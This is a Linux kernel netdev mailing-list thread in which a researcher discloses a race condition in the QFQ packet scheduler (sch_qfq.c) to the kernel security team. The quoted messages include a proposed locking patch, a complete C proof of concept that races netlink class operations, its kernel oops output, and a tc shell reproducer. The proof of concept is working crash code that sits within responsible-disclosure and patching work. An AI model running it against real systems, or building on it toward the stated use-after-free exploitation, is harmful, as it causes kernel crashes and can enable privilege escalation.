Return-Path: <netdev+bounces-202925-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [IPv6:2604:1380:45e3:2400::1])
	by mail.lfdr.de (Postfix) with ESMTPS id DC5FAAEFBAC
	for <lists+netdev@lfdr.de>; Tue,  1 Jul 2025 16:10:01 +0200 (CEST)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 71D503BC738
	for <lists+netdev@lfdr.de>; Tue,  1 Jul 2025 14:06:30 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 984A2275854;
	Tue,  1 Jul 2025 14:02:40 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b="YKQx8Mew"
X-Original-To: netdev@vger.kernel.org
Received: from mail-pf1-f178.google.com (mail-pf1-f178.google.com [209.85.210.178])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 40E1F275841
	for <netdev@vger.kernel.org>; Tue,  1 Jul 2025 14:02:36 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.178
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1751378560; cv=none; b=oASVcPgp/dsHqwIgChH/mCxk2JgqLYRUZ0TdcShE4E/6YKudGdF2k0G+lTehbv+nBePFmTylXN08G9yOe6NKT1EEKcmF10WJmNKXam4a79dZmuzcNiQ/WZ5u3r+4a0KNViMUtmVIRhfVDah1Gv79mJgs/e2EcIeaRgbj2kS3CBc=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1751378560; c=relaxed/simple;
	bh=gYoYs50YsdbaNeNrlTbxohO+1W6M8QaRneGqUSUFZMw=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=Cd13LpDyebxyIXxEn5vzjWNurot+I/9ojutTEZS2c/hKGdfkxEcG3e8nc5K03v7HqEC5IC6c1VP5O2Pzavc4CYKxQKtl9nsjHpZsRGe/Ayjf+jAgexKXVHVtQJEogohsISfl/dJfa5vOqPI4VFPfSVTu69BHRzOLaSozdm2TVhE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com; spf=none smtp.mailfrom=mojatatu.com; dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b=YKQx8Mew; arc=none smtp.client-ip=209.85.210.178
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com
Authentication-Results: smtp.subspace.kernel.org; spf=none smtp.mailfrom=mojatatu.com
Received: by mail-pf1-f178.google.com with SMTP id d2e1a72fcca58-7481600130eso4205886b3a.3
        for <netdev@vger.kernel.org>; Tue, 01 Jul 2025 07:02:36 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=mojatatu-com.20230601.gappssmtp.com; s=20230601; t=1751378556; x=1751983356; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=xDn8JB6L0ndhqsxrf7TZNx+CvWHCO4ILQVKOmITSgWg=;
        b=YKQx8MewX+e5hWdIboNu9ZkuJvX5dQpEUbm5JMGHXyKTqP2AJSKVachj2oD420zH3H
         nwXaC0JeLIEZeOVZeaAyMLD9apP2zulK0EOaA5vo+W0SIhCz57Zd3GHmUDWpbZuJjx+0
         OzT07rabRpPkYgIC5s6F7aGOGADrbLgUuPhTSNkBjdoT1v+QLm/5hCiIvomD831UDAac
         Q94ZsaMU1APj5m/yCBxzisbQsuw7zBO1NDcOy/CDZH5meZ8fHPZzYVk4PWWqWwmm+vGB
         W7xnFvsBgLrUR4W3KMsmapyuuTSqsYwKMhmY3mqzc34MSFBtx1nDdY7oDVyu8k9F//Fy
         UPKA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1751378556; x=1751983356;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=xDn8JB6L0ndhqsxrf7TZNx+CvWHCO4ILQVKOmITSgWg=;
        b=wP3hWnQWyybXqGChKaIc3bjZqbv/khNs6h1nzfte1c6lm58U1kGf6cbJHdDXDCzZAI
         9MQ94AHOjRKYrmw7Z00LSGoyMsueJT/wHZlLNkTXrIXqvMcItP4yFTBRwYMOYiSspwff
         1sNs3jFW27xWrNkJsR40N+ArMcFqhXVZ6/Q6SDcDAhT83SleHnXkflVPutNPSWvGUO5t
         yHgGxz7WKBvmXnLuXFp3x6+9gSZI/U7/J5KLRGNQ03w4LeIpzwNWDLAZ15nIIM1DSIm/
         XvCVo/9kwBdMxWBGZXf1P4WWtq9y8uaFeQ1jtIBzl8CYLWfJV8J3rNsypDrOWJwrWiMF
         C6pw==
X-Forwarded-Encrypted: i=1; AJvYcCX5iySnzuw572pd0pTaJuSIdxXoQaaPe+LK7dg3KR7HA96PIZcT9b3/ai0hy1GMvIf1ZlciNuc=@vger.kernel.org
X-Gm-Message-State: AOJu0YxefVBE8BEWpntw2bml4KzZ1avAgzTAV2dURlVu7Ov7pQ3783F0
	8RK0oqVaN9MyAClF9D4DMqC46Dtmr9+sJtoOPgTADmkNa/v12lS8CZrOdqUsM1EmpyGjanyTX2c
	EralnoEiMMCIViNco0wIwpArh69VOD1RVAmca+uyW
X-Gm-Gg: ASbGncusofV8YDnBGazX42gL6A3WKoBaru48zz47qdCXMmCAOlb5wzS1KPdnG7Nu1uh
	lnnESD4pHVPGoeI7aLIiUhsUxXbjJaWQtK0epeMGqb3rvB7JHD9tQZRpapXqaDx5QdKtNw7Lb01
	B8VFkhkyJzCSCW+kkpmJDx/A7D4VM4y/fO0eR880QcTw==
X-Google-Smtp-Source: AGHT+IGrxdR0Ko8Pclfb/8SoZmBig+e4tvbjhV6CBh6Uugr3oJ0nOSfYkvUIpgVXUr0tw3cX4e+qXyoQZhnH30xEMK0=
X-Received: by 2002:a05:6a00:3cd5:b0:74a:f611:484 with SMTP id
 d2e1a72fcca58-74af70a825cmr26787774b3a.24.1751378554571; Tue, 01 Jul 2025
 07:02:34 -0700 (PDT)
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <CAPpSM+SKOj9U8g_QsGp8M45dtEwvX4B_xdd7C0mP9pYu1b4mzA@mail.gmail.com>
 <CAM0EoMn+UiSmpH=iBeevpUN5N8TW+2GSEmyk6vA2MWOKgsRjBA@mail.gmail.com>
 <aGIAbGB1VAX-M8LQ@xps> <CAM0EoMnBoCpc7hnK_tghXNMWy+r7nKPGSsKrJiHoQo=G8F6k=A@mail.gmail.com>
 <CAPpSM+SSyCgM6aaPwceBQk9FukDd7yRVmHwvGYJMKpzd+quUaA@mail.gmail.com>
In-Reply-To: <CAPpSM+SSyCgM6aaPwceBQk9FukDd7yRVmHwvGYJMKpzd+quUaA@mail.gmail.com>
From: Jamal Hadi Salim <jhs@mojatatu.com>
Date: Tue, 1 Jul 2025 10:02:23 -0400
X-Gm-Features: Ac12FXyq-PUgPLRZQFrmQ0B_tC_g4SFbmlVfMlsPL7_345fyeM8z9hKY_lyN3q4
Message-ID: <CAM0EoM=vtAhdDp4CrHN9PGKrAXUBYiD-o3L6gT0=5U_eK0qf_w@mail.gmail.com>
Subject: Re: sch_qfq: race conditon on qfq_aggregate (net/sched/sch_qfq.c)
To: Xiang Mei <xmei5@asu.edu>
Cc: security@kernel.org, 
	Linux Kernel Network Developers <netdev@vger.kernel.org>, Cong Wang <xiyou.wangcong@gmail.com>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

On Mon, Jun 30, 2025 at 2:49=E2=80=AFPM Xiang Mei <xmei5@asu.edu> wrote:
>
> Thank you very much for your time. We've re-tested the PoC and
> confirmed it works on the latest kernels (6.12.35, 6.6.95, and
> 6.16-rc4).
>
> To help with reproduction, here are a few notes that might be useful:
> 1. The QFQ scheduler needs to be compiled into the kernel:
>     $ scripts/config --enable CONFIG_NET_SCHED
>     $ scripts/config --enable CONFIG_NET_SCH_QFQ
> 2. Since this is a race condition, the test environment should have at
> least two cores (e.g., -smp cores=3D2 for QEMU).
> 3. The PoC was compiled using: `gcc ./poc.c -o ./poc  -w --static`
> 4. Before running the PoC, please check that the network interface
> "lo" is in the "up" state.
>

Yes, for this POC i can confirm activates the issue.

Sorry, I actually meant your other/different patch/issue earlier which
has the following reproducer:
tc qdisc del dev lo root 2>/dev/null
tc qdisc add dev lo root handle 1: qfq
tc class add dev lo parent 1: classid 1:1 qfq weight 1 maxpkt 1024
tc qdisc add dev lo parent 1:1 handle 10: fq maxrate 1
tc filter add dev lo protocol all parent 1: prio 1 basic \
  match "meta(priority eq 0x20001)" \
  flowid 1:1
while true; do ping -c 1 127.0.0.1 > /dev/null; done

Does this reproducer work for you for that example?

cheers,
jamal



> Appreciate your feedback and patience.
>
> Best regards,
> Xiang Mei
>
>
> On Mon, Jun 30, 2025 at 4:36=E2=80=AFAM Jamal Hadi Salim <jhs@mojatatu.co=
m> wrote:
> >
> > On Sun, Jun 29, 2025 at 11:11=E2=80=AFPM Xiang Mei <xmei5@asu.edu> wrot=
e:
> > >
> > > On Sun, Jun 29, 2025 at 10:28:12AM -0400, Jamal Hadi Salim wrote:
> > > > On Sun, Jun 29, 2025 at 3:13=E2=80=AFAM Xiang Mei <xmei5@asu.edu> w=
rote:
> > > > >
> > > > > Linux Kernel Security Team,
> > > > >
> > > > > We are writing to bring to your attention a race condition vulner=
ability in net/sched/sch_qfq.c.
> > > > >
> > > > > In function qfq_delete_class, the line `qfq_destroy_class(sch, cl=
);` is outside the protection of ` sch_tree_lock`, so any operation on agg =
could lead to a race condition vulnerability. For example, we can get a UAF=
 by racing it with qfq_change_agg in qfq_enqueue.
> > > > >
> > > > > We verified it on v6.6.94 and exploited it in kernelCTF cos-109-1=
7800.519.32.
> > > > > A temporal fix could be
> > > > > ```c
> > > > > @@ -558,10 +562,9 @@ static int qfq_delete_class(struct Qdisc *sc=
h, unsigned long arg,
> > > > >
> > > > >  qdisc_purge_queue(cl->qdisc);
> > > > >  qdisc_class_hash_remove(&q->clhash, &cl->common);
> > > > > -
> > > > > +        qfq_destroy_class(sch, cl);
> > > > >  sch_tree_unlock(sch);
> > > > >
> > > > > -       qfq_destroy_class(sch, cl);
> > > > >  return 0;
> > > > >  }
> > > > > ```
> > > > >
> > > > > But this only avoids the exploitation. There are other places to =
exploit the vulnerability with a General Protection (usually null-deref). W=
e found two places that can crash the kernel:
> > > > >
> > > > > 1. When modifying an existing class in  qfq_change_class, the rea=
ds of cl->agg->weight or cl->agg->lmax could lead to GPs.
> > > > > 2. Reads of agg content in qfq_dump_class could lead to GPs.
> > > > >
> > > > > These reads of the agg structure may require `RCU` or `lock` to p=
rotect.
> > > > >
> > > > > Looking forward to hearing from you and discussing the patching.
> > > > >
> > > >
> > > >
> > > > Please partake in the discussion to fix this, your other issue and
> > > > others on the netdev list, start with this thread:
> > > > https://lore.kernel.org/netdev/aF847kk6H+kr5kIV@pop-os.localdomain/
> > >
> > > Thanks so much for your time and the helpful information.
> > >
> > > Here is a potential patch to this vulnerability:
> > >
> > > sch_lock was used to protect the read/write options of aggs. The
> > > lock may influence the performance of the scheduler, and RCU could al=
so
> > > be a patch option.
> > >
> >
> >
> > I did test your earlier repro and could not create the issue. I dont
> > have time right now, but are you sure this new repro can create the
> > issue?
> >
> > cheers,
> > jamal
> >
> > > ```
> > > From e64c4f5d662dc3f3c5dedf4b755a151d826d7f70 Mon Sep 17 00:00:00 200=
1
> > > From: n132 <xmei5@asu.edu>
> > > Date: Sun, 29 Jun 2025 16:26:43 -0700
> > > Subject: [PATCH] net/sched: sch_qfq: Fix qfq_aggregate race condition
> > >
> > > Apply sch_lock when reading or modifying agg data to prevent race con=
ditions between class options and enqueue.
> > > ---
> > >  net/sched/sch_qfq.c | 30 +++++++++++++++++++++---------
> > >  1 file changed, 21 insertions(+), 9 deletions(-)
> > >
> > > diff --git a/net/sched/sch_qfq.c b/net/sched/sch_qfq.c
> > > index bf1282cb22eb..dc77ffc01bb3 100644
> > > --- a/net/sched/sch_qfq.c
> > > +++ b/net/sched/sch_qfq.c
> > > @@ -412,7 +412,7 @@ static int qfq_change_class(struct Qdisc *sch, u3=
2 classid, u32 parentid,
> > >         bool existing =3D false;
> > >         struct nlattr *tb[TCA_QFQ_MAX + 1];
> > >         struct qfq_aggregate *new_agg =3D NULL;
> > > -       u32 weight, lmax, inv_w;
> > > +       u32 weight, lmax, inv_w, old_weight, old_lmax;
> > >         int err;
> > >         int delta_w;
> > >
> > > @@ -443,12 +443,16 @@ static int qfq_change_class(struct Qdisc *sch, =
u32 classid, u32 parentid,
> > >         inv_w =3D ONE_FP / weight;
> > >         weight =3D ONE_FP / inv_w;
> > >
> > > -       if (cl !=3D NULL &&
> > > -          lmax =3D=3D cl->agg->lmax &&
> > > -          weight =3D=3D cl->agg->class_weight)
> > > -               return 0; /* nothing to change */
> > > +       if(cl !=3D NULL){
> > > +               sch_tree_lock(sch);
> > > +               old_weight =3D cl->agg->class_weight;
> > > +               old_lmax   =3D cl->agg->lmax;
> > > +               sch_tree_unlock(sch);
> > > +               if (lmax =3D=3D old_lmax && weight =3D=3D old_weight)
> > > +                       return 0; /* nothing to change */
> > > +       }
> > >
> > > -       delta_w =3D weight - (cl ? cl->agg->class_weight : 0);
> > > +       delta_w =3D weight - (cl ? old_weight : 0);
> > >
> > >         if (q->wsum + delta_w > QFQ_MAX_WSUM) {
> > >                 NL_SET_ERR_MSG_FMT_MOD(extack,
> > > @@ -555,10 +559,10 @@ static int qfq_delete_class(struct Qdisc *sch, =
unsigned long arg,
> > >
> > >         qdisc_purge_queue(cl->qdisc);
> > >         qdisc_class_hash_remove(&q->clhash, &cl->common);
> > > +       qfq_destroy_class(sch, cl);
> > >
> > >         sch_tree_unlock(sch);
> > >
> > > -       qfq_destroy_class(sch, cl);
> > >         return 0;
> > >  }
> > >
> > > @@ -625,6 +629,8 @@ static int qfq_dump_class(struct Qdisc *sch, unsi=
gned long arg,
> > >  {
> > >         struct qfq_class *cl =3D (struct qfq_class *)arg;
> > >         struct nlattr *nest;
> > > +       u32 class_weight;
> > > +       u32 lmax;
> > >
> > >         tcm->tcm_parent =3D TC_H_ROOT;
> > >         tcm->tcm_handle =3D cl->common.classid;
> > > @@ -633,8 +639,12 @@ static int qfq_dump_class(struct Qdisc *sch, uns=
igned long arg,
> > >         nest =3D nla_nest_start_noflag(skb, TCA_OPTIONS);
> > >         if (nest =3D=3D NULL)
> > >                 goto nla_put_failure;
> > > -       if (nla_put_u32(skb, TCA_QFQ_WEIGHT, cl->agg->class_weight) |=
|
> > > -          nla_put_u32(skb, TCA_QFQ_LMAX, cl->agg->lmax))
> > > +       sch_tree_lock(sch);
> > > +       class_weight =3D cl->agg->class_weight;
> > > +       lmax         =3D cl->agg->lmax;
> > > +       sch_tree_unlock(sch);
> > > +       if (nla_put_u32(skb, TCA_QFQ_WEIGHT, class_weight) ||
> > > +          nla_put_u32(skb, TCA_QFQ_LMAX, lmax))
> > >                 goto nla_put_failure;
> > >         return nla_nest_end(skb, nest);
> > >
> > > @@ -651,8 +661,10 @@ static int qfq_dump_class_stats(struct Qdisc *sc=
h, unsigned long arg,
> > >
> > >         memset(&xstats, 0, sizeof(xstats));
> > >
> > > +       sch_tree_lock(sch);
> > >         xstats.weight =3D cl->agg->class_weight;
> > >         xstats.lmax =3D cl->agg->lmax;
> > > +       sch_tree_unlock(sch);
> > >
> > >         if (gnet_stats_copy_basic(d, NULL, &cl->bstats, true) < 0 ||
> > >            gnet_stats_copy_rate_est(d, &cl->rate_est) < 0 ||
> > > --
> > > 2.43.0
> > > ```
> > >
> > > Here is the PoC triggering the race condition for your reference:
> > >
> > > ```c
> > > #include <stdio.h>
> > > #include <sys/socket.h>
> > > #include <linux/rtnetlink.h>
> > > #include <linux/pkt_sched.h>
> > > #include <linux/if_arp.h>
> > > struct tf_msg {
> > >     struct nlmsghdr nlh;
> > >     struct tcmsg tcm;
> > > #define TC_DATA_LEN 0x200
> > >     char attrbuf[TC_DATA_LEN];
> > > };
> > > struct if_msg {
> > >     struct nlmsghdr nlh;
> > >     struct ifinfomsg ifi;
> > > };
> > > typedef unsigned int u32;
> > > int nl, inet_sock_fd;
> > > char *  msgQdiscCreate;
> > > char *  tclass_0x20001_create;
> > > char *  tclass_0x20002_create;
> > > char *  tclass_0x20001_reset;
> > >
> > > unsigned short add_rtattr (unsigned long rta_addr, unsigned short typ=
e, unsigned short len, char *data) {
> > >     struct rtattr *rta =3D (struct rtattr *)rta_addr;
> > >     rta->rta_type =3D type;
> > >     rta->rta_len =3D RTA_LENGTH(len);
> > >     memcpy(RTA_DATA(rta), data, len);
> > >     return rta->rta_len;
> > > }
> > > int initNL(){
> > >     struct if_msg if_up_msg =3D {
> > >         {
> > >             .nlmsg_len =3D 32,
> > >             .nlmsg_type =3D RTM_NEWLINK,
> > >             .nlmsg_flags =3D NLM_F_REQUEST | NLM_F_ACK,
> > >         },
> > >         {
> > >             .ifi_family =3D AF_UNSPEC,
> > >             .ifi_type =3D ARPHRD_NETROM,
> > >             .ifi_index =3D 1,
> > >             .ifi_flags =3D IFF_UP,
> > >             .ifi_change =3D 1,
> > >         },
> > >     };
> > >     int nl_sock_fd =3D socket(PF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
> > >     if_up_msg.ifi.ifi_index =3D if_nametoindex("lo");
> > >     NLMsgSend(nl_sock_fd, (struct tf_msg *)(&if_up_msg));
> > >     return nl_sock_fd;
> > > }
> > > void NLMsgSend (int sock, struct tf_msg *m) {
> > >     struct {
> > >         struct nlmsghdr nh;
> > >         struct nlmsgerr ne;
> > >     } ack;
> > >     write(sock, m, m->nlh.nlmsg_len);
> > >     read(sock , &ack, sizeof(ack));
> > > }
> > > /* Prepared Values*/
> > > void init_loopbacksend (u32 prio) {
> > >     struct sockaddr iaddr =3D { AF_INET };
> > >     inet_sock_fd =3D socket(PF_INET, SOCK_DGRAM, 0);
> > >     int res =3D setsockopt(inet_sock_fd, SOL_SOCKET, SO_PRIORITY, &pr=
io, sizeof(prio));
> > >     connect(inet_sock_fd, &iaddr, sizeof(iaddr));
> > > }
> > >
> > > /* Trafic control for netlink */
> > > void init_tf_msg (struct tf_msg *m) {
> > >     m->nlh.nlmsg_len    =3D NLMSG_LENGTH(sizeof(m->tcm));
> > >     m->nlh.nlmsg_type   =3D 0;    // Default Value
> > >     m->nlh.nlmsg_flags  =3D NLM_F_REQUEST | NLM_F_ACK;
> > >     m->nlh.nlmsg_seq    =3D 0;    // Default Value
> > >     m->nlh.nlmsg_pid    =3D 0;    // Default Value
> > >
> > >     // tcmsg
> > >     m->tcm.tcm_family   =3D PF_UNSPEC;
> > >     m->tcm.tcm_ifindex  =3D if_nametoindex("lo");
> > >     m->tcm.tcm_handle   =3D 0;    // Default Value
> > >     m->tcm.tcm_parent   =3D -1;   // Default Value for no parent
> > >     m->tcm.tcm_info     =3D 0;    // Default Value
> > > }
> > >
> > > struct tf_msg * classGet(u32 classid){
> > >     struct tf_msg *m =3D calloc(1,sizeof(struct tf_msg));
> > >     init_tf_msg(m);
> > >     m->nlh.nlmsg_type        =3D RTM_GETTCLASS;
> > >     m->tcm.tcm_handle        =3D classid;
> > >     return m;
> > > }
> > > struct tf_msg * qfqQdiscAdd(u32 handle, u32 parent) {
> > >     struct tf_msg *m =3D calloc(1,sizeof(struct tf_msg));
> > >     init_tf_msg(m);
> > >     m->nlh.nlmsg_type    =3D RTM_NEWQDISC;
> > >     m->nlh.nlmsg_flags   |=3D NLM_F_CREATE;
> > >     m->tcm.tcm_handle    =3D handle;
> > >     m->tcm.tcm_parent    =3D parent;
> > >     m->nlh.nlmsg_len     +=3D NLMSG_ALIGN(add_rtattr((size_t)m + NLMS=
G_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
> > >     return m;
> > > }
> > > struct tf_msg * qfqClassAdd(int type, u32 classid,u32 val){
> > >     struct tf_msg *m =3D calloc(1,sizeof(struct tf_msg));
> > >     init_tf_msg(m);
> > >     m->nlh.nlmsg_type       =3D RTM_NEWTCLASS;
> > >     m->tcm.tcm_parent       =3D 0;
> > >     m->tcm.tcm_handle       =3D classid;
> > >     m->nlh.nlmsg_flags      |=3D NLM_F_CREATE;
> > >     m->nlh.nlmsg_len        +=3D NLMSG_ALIGN(add_rtattr((size_t)m + N=
LMSG_ALIGN(m->nlh.nlmsg_len), TCA_KIND, strlen("qfq") + 1, "qfq"));
> > >
> > >     struct rtattr *opts     =3D (struct rtattr *)((size_t)m + NLMSG_A=
LIGN(m->nlh.nlmsg_len));
> > >     opts->rta_type          =3D TCA_OPTIONS;
> > >     opts->rta_len           =3D RTA_LENGTH(0);
> > >
> > >     if(type =3D=3D TCA_QFQ_LMAX)
> > >         opts->rta_len +=3D RTA_ALIGN(add_rtattr((size_t)opts + opts->=
rta_len, TCA_QFQ_LMAX, sizeof(val), (char *)&val));
> > >     else if(type =3D=3D TCA_QFQ_WEIGHT)
> > >         opts->rta_len +=3D RTA_ALIGN(add_rtattr((size_t)opts + opts->=
rta_len, TCA_QFQ_WEIGHT, sizeof(val), (char *)&val));
> > >     m->nlh.nlmsg_len +=3D NLMSG_ALIGN(opts->rta_len);
> > >     return m;
> > > }
> > > void initContext(){
> > >     msgQdiscCreate =3D        qfqQdiscAdd(0x20000,-1);
> > >     tclass_0x20001_reset  =3D tclass_0x20001_create =3D qfqClassAdd(T=
CA_QFQ_LMAX,0x20001,0x200);
> > >     tclass_0x20002_create =3D qfqClassAdd(TCA_QFQ_LMAX,0x20002,0x400)=
;
> > > }
> > > int main(){
> > >     initContext();
> > >     nl =3D initNL();
> > >     NLMsgSend(nl,msgQdiscCreate);
> > >     NLMsgSend(nl,tclass_0x20001_create);
> > >     NLMsgSend(nl,tclass_0x20002_create);
> > >     init_loopbacksend(0x20001);
> > >     if(fork()){
> > >         while(1){
> > >             write(inet_sock_fd, "", 0x400-42); // upgrade
> > >             NLMsgSend(nl,tclass_0x20001_reset);
> > >         }
> > >     }else{
> > >         char * pay =3D classGet(0x20001);
> > >         while(1)
> > >             NLMsgSend(nl,pay);
> > >     }
> > > }
> > >
> > > /*
> > > [    1.078863] BUG: kernel NULL pointer dereference, address: 0000000=
000000028
> > > [    1.079284] #PF: supervisor read access in kernel mode
> > > [    1.079580] #PF: error_code(0x0000) - not-present page
> > > [    1.079882] PGD 101e10067 P4D 101e10067 PUD 101e11067 PMD 0
> > > [    1.080211] Oops: 0000 [#1] PREEMPT SMP NOPTI
> > > [    1.080466] CPU: 1 PID: 117 Comm: exploit Not tainted 6.6.94 #1
> > > [    1.080873] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 19=
96), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> > > [    1.081426] RIP: 0010:qfq_dump_class+0x7f/0x120
> > > [    1.081700] Code: 2b 95 ff 85 c0 0f 88 a3 00 00 00 4d 85 e4 0f 84 =
9a 00 00 00 48 8b 45 68 48 8d 4c 24 04 ba 04 00 00 00 48 89 df be 01 00 00 =
00 <8b> 40 28 89 44 24 04 e8 c5 2b 95 ff 85 c0 75 5b 48 8b 45 68 48 8d
> > > [    1.082747] RSP: 0018:ffffc900004975b0 EFLAGS: 00010282
> > > [    1.083050] RAX: 0000000000000000 RBX: ffff8881013e7100 RCX: ffffc=
900004975b4
> > > [    1.083447] RDX: 0000000000000004 RSI: 0000000000000001 RDI: ffff8=
881013e7100
> > > [    1.083846] RBP: ffff888100b90380 R08: 0000000000000014 R09: ffff8=
8810177e030
> > > [    1.084238] R10: 00000000000381a0 R11: ffff888101fd8000 R12: ffff8=
8810177e02c
> > > [    1.084645] R13: ffff88810177e000 R14: ffffffff82d662a0 R15: ffff8=
88101fd8000
> > > [    1.085072] FS:  00000000198fe3c0(0000) GS:ffff88811c500000(0000) =
knlGS:0000000000000000
> > > [    1.085557] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> > > [    1.085888] CR2: 0000000000000028 CR3: 000000010168e000 CR4: 00000=
00000750ee0
> > > [    1.086329] PKRU: 55555554
> > > [    1.086491] Call Trace:
> > > [    1.086645]  <TASK>
> > > [    1.086777]  tc_fill_tclass+0x145/0x240
> > > [    1.087008]  tclass_notify.constprop.0+0x6a/0xd0
> > > [    1.087275]  tc_ctl_tclass+0x3bc/0x5a0
> > > [    1.087496]  rtnetlink_rcv_msg+0x14e/0x3d0
> > > [    1.087734]  ? kmem_cache_alloc_node+0x4b/0x520
> > > [    1.088011]  ? __pfx_rtnetlink_rcv_msg+0x10/0x10
> > > [    1.088281]  netlink_rcv_skb+0x57/0x100
> > > [    1.088506]  netlink_unicast+0x247/0x390
> > > [    1.088733]  netlink_sendmsg+0x250/0x4d0
> > > [    1.088964]  sock_write_iter+0x199/0x1a0
> > > [    1.089192]  vfs_write+0x393/0x440
> > > [    1.089396]  ksys_write+0xb7/0xf0
> > > [    1.089591]  do_syscall_64+0x5e/0x90
> > > [    1.089801]  ? do_syscall_64+0x6a/0x90
> > > [    1.090022]  ? netlink_rcv_skb+0x84/0x100
> > > [    1.090254]  ? kmem_cache_free+0x1e/0x360
> > > [    1.090484]  ? kmem_cache_free+0x1e/0x360
> > > [    1.090713]  ? netlink_unicast+0x252/0x390
> > > [    1.090953]  ? netlink_sendmsg+0x25d/0x4d0
> > > [    1.091189]  ? sock_write_iter+0x199/0x1a0
> > > [    1.091425]  ? vfs_write+0x393/0x440
> > > [    1.091633]  ? exit_to_user_mode_prepare+0x1a/0x150
> > > [    1.091915]  ? syscall_exit_to_user_mode+0x27/0x40
> > > [    1.092190]  ? do_syscall_64+0x6a/0x90
> > > [    1.092407]  ? exit_to_user_mode_prepare+0x1a/0x150
> > > [    1.092686]  ? syscall_exit_to_user_mode+0x27/0x40
> > > [    1.092962]  ? do_syscall_64+0x6a/0x90
> > > [    1.093180]  ? do_syscall_64+0x6a/0x90
> > > [    1.093397]  ? clear_bhb_loop+0x60/0xb0
> > > [    1.093620]  ? clear_bhb_loop+0x60/0xb0
> > > [    1.093842]  ? clear_bhb_loop+0x60/0xb0
> > > [    1.094066]  ? clear_bhb_loop+0x60/0xb0
> > > [    1.094287]  ? clear_bhb_loop+0x60/0xb0
> > > [    1.094508]  entry_SYSCALL_64_after_hwframe+0x78/0xe2
> > > */
> > > ```
> > >
> > > >
> > > > cheers,
> > > > jamal
> > > >
> > > >
> > > > > Thanks,
> > > > > Xiang Mei

